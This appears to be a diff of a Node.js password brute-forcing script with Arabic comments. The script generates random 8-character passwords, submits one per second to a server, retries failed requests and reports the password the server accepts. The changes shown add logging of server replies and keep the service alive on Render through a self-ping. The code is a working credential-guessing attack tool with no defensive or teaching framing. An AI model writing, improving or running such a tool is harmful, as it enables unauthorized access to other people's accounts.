@@ -13,7 +13,6 @@ let allPasswords = [];
 let currentIndex = 0;
 const retryLimit = 3;
 
-// التحقق إن الخطأ يحتاج إعادة المحاولة
 function isRetryableError(error) {
   return (
     error.code === "ECONNABORTED" ||
@@ -44,7 +43,11 @@ async function tryPassword(password, attempt = 1) {
       }
     );
 
-    if (response.data && typeof response.data === "object" && response.data.status === 1) {
+    const body = response.data;
+    console.log(`🧪 تجربة: ${password}`);
+    console.log("📨 رد السيرفر:", body);
+
+    if (body && typeof body === "object" && body.status === 1) {
       foundPassword = password;
       finished = true;
       console.log(`✅ كلمة المرور الصحيحة: ${password}`);
@@ -53,10 +56,14 @@ async function tryPassword(password, attempt = 1) {
     }
   } catch (error) {
     if (isRetryableError(error) && attempt < retryLimit && !foundPassword && !finished) {
-      console.log(`⚠️ خطأ مع الباسورد ${password}... إعادة المحاولة (${attempt})`);
+      console.log(`⚠️ خطأ في الاتصال مع الباسورد ${password}... إعادة المحاولة (${attempt})`);
       await tryPassword(password, attempt + 1);
     } else {
-      console.log(`❌ فشل في المحاولة: ${password} (${error.code || error.message})`);
+      console.log(`❌ فشل التجربة: ${password}`);
+      console.log("🛑 الخطأ:", error.message || error.code || error);
+      if (error.response?.data) {
+        console.log("📨 رد السيرفر (حتى مع الخطأ):", error.response.data);
+      }
     }
   }
 }
@@ -73,7 +80,7 @@ async function bruteForceStart() {
     currentTry = password;
     await tryPassword(password);
     currentIndex++;
-  }, 1000); // 1 باسورد / ثانية
+  }, 1000);
 }
 
 app.get("/", (req, res) => {
@@ -95,14 +102,13 @@ app.get("/", (req, res) => {
   res.send(html);
 });
 
-// توليد كلمات مرور عشوائية: 8 خانات - حروف صغيرة وأرقام (0-3 أرقام فقط)
 function generatePasswords(count) {
   const charset = "abcdefghijklmnopqrstuvwxyz";
   const digits = "0123456789";
   const list = new Set();
 
   while (list.size < count) {
-    let numDigits = Math.floor(Math.random() * 4); // من 0 إلى 3 أرقام
+    let numDigits = Math.floor(Math.random() * 4); // 0-3 digits
     let numLetters = 8 - numDigits;
     let pass = "";
 
@@ -130,7 +136,7 @@ app.listen(PORT, () => {
   console.log(`🚀 Server running at http://localhost:${PORT}`);
 });
 
-// إبقاء الخدمة نشطة (ping لـ Render كل 5 دقائق)
+// ping للرابط كل 5 دقائق حتى يبقى حي على Render
 setInterval(() => {
   axios.get("https://noon-9v11.onrender.com/").catch(() => {});
 }, 5 * 60 * 1000);
